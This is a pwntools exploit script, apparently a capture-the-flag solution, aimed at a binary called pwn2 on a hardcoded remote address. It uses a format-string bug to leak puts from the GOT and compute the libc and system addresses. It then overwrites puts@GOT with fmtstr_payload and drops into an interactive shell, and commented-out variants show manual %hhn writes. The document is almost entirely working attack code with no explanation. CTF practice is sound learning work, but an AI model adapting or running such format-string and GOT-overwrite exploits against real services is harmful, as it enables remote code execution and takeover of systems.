from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8002]
libc=ELF('./libc-2.31.so')
elf = ELF('./pwn2')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn2")
    context(arch='amd64',os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch ='amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
ru(b'something?\n')
puts_got = elf.got['puts']
pr('puts_got',puts_got)
payload = b'a' * 4 + b'%7$s' + p64(puts_got)
#payload = b'aaaa%10$p' 
s(payload)
#str = rl()
#leak_addr = int(str[-13:-1],16)
#pr('leak_addr',leak_addr)
#t = leak_addr - 0x18
ru(b'aaaa')
puts_addr = u64(rc(6) + b'\x00\x00')
libc_base = puts_addr - libc.sym['puts']
pr('libc_base',libc_base)
system_addr = libc_base + libc.sym['system']
pr('system_addr',system_addr)
pr('puts_addr',puts_addr)
#sys_high = (system_addr >> 16) & 0xff
#sys_low = (system_addr) & 0xffff
#sys_mid = (sys_low & 0xff00) >> 8
#sys_low = (sys_low) & 0xff
#pr('system_addr',system_addr)
#pr('sys_high',sys_high)
#pr('sys_mid',sys_mid)
#pr('sys_low',sys_low)
#payload2 = b'%' + bytes(str(sys_low),encoding='UTF-8') + b'c%14$hhn'
#payload2 += b'%' + bytes(str(sys_mid),encoding='UTF-8') + b'c%15$hhn'
#payload2 += b'%' + bytes(str(sys_high),encoding='UTF-8') + b'c%16$hhn'
#payload2 = payload2.ljust(48,b'a') + p64(puts_got) + p64(puts_got + 1) + p64(puts_got + 2)
#payload2 = fmtstr_payload(8,{puts_got:system_addr})
payload2 = fmtstr_payload(8,{puts_got:0x40121b})
#payload2 = b'%27c%7hhnaaabaa' + p64(t)
sa(b'deeper\n',payload2)

shell()
